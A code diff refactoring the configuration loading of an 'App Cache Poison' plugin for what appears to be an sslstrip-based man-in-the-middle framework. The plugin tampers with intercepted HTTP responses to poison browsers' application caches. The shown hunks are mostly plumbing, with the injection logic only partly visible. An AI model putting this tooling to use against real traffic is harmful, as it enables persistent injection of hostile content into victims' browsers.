@@ -1,15 +1,14 @@
-#
+
 # 99.9999999% of this code was stolen from https://github.com/koto/sslstrip by Krzysztof Kotowicz
-#######################################################################################################
 
 from plugins.plugin import Plugin
 from datetime import date
 from libs.sslstrip.URLMonitor import URLMonitor
 import logging
-import ConfigParser
 import re 
 import os.path
 import time
+import sys
 
 class AppCachePlugin(Plugin):
     name = "App Cache Poison"
@@ -21,24 +20,15 @@ class AppCachePlugin(Plugin):
     def initialize(self, options):
         '''Called if plugin is enabled, passed the options namespace'''
         self.options = options
-        self.config_file = "./config/app_cache_poison.cfg"
-        self.config = None
         self.mass_poisoned_browsers = []
         self.urlMonitor = URLMonitor.getInstance()
 
+        try:
+            self.config = options.configfile['AppCachePoison']
+        except Exception, e:
+            sys.exit("[-] Error parsing config file for AppCachePoison: " + str(e))
+
         print "[*] App Cache Poison plugin online"
-        self.createTamperer(self.config_file)
-
-    def parseConfig(self, configFile):
-        config = ConfigParser.ConfigParser()
-        config.read(configFile)
-        readConfig = config._sections
-        readConfig.update(config.defaults())
-        return readConfig
-
-    def createTamperer(self, configFile):
-        logging.debug("Reading tamper config file: %s"  % (configFile))
-        self.config = self.parseConfig(configFile)
 
     def handleResponse(self, request, data):
 
@@ -55,12 +45,12 @@ class AppCachePlugin(Plugin):
                
         urls = self.urlMonitor.getRedirectionSet(url)
         
-        (s,element,url) = self.getSectionForUrls(urls)
-        if not s:
+        (name,s,element,url) = self.getSectionForUrls(urls)
+        if s is False:
           data = self.tryMassPoison(url, data, headers, req_headers, ip)
           return {'request': request, 'data': data}
 
-        logging.debug("Found URL %s in section %s" % (url, s['__name__']))
+        logging.debug("Found URL %s in section %s" % (url, name))
         p = self.getTemplatePrefix(s)
         if element == 'tamper':
           logging.debug("Poisoning tamper URL with template %s" % (p))
@@ -160,12 +150,12 @@ class AppCachePlugin(Plugin):
 
     def getTemplatePrefix(self, section):
         if section.has_key('templates'):
-          return self.config['templates_path'] + '/' + section['templates']
-
+            return self.config['templates_path'] + '/' + section['templates']
+        
         return self.getDefaultTemplatePrefix()
 
     def getDefaultTemplatePrefix(self):
-          return self.config['templates_path'] + '/default'
+        return self.config['templates_path'] + '/default'
 
     def getManifestUrl(self, section):
       return section.get("manifest_url",'/robots.txt')
@@ -175,15 +165,16 @@ class AppCachePlugin(Plugin):
             for i in self.config:
               if isinstance(self.config[i], dict): #section
                 section = self.config[i]
+                name = i
                 if section.get('tamper_url',False) == url:
-                  return (section, 'tamper',url)
+                  return (name, section, 'tamper',url)
                 if section.has_key('tamper_url_match') and re.search(section['tamper_url_match'], url):
-                  return (section, 'tamper',url)
+                  return (name, section, 'tamper',url)
                 if section.get('manifest_url',False) == url:
-                  return (section, 'manifest',url)
+                  return (name, section, 'manifest',url)
                 if section.get('raw_url',False) == url:
-                  return (section, 'raw',url)
+                  return (name, section, 'raw',url)
 
-        return (False,'',urls.copy().pop())
+        return (None, False,'',urls.copy().pop())
 
 
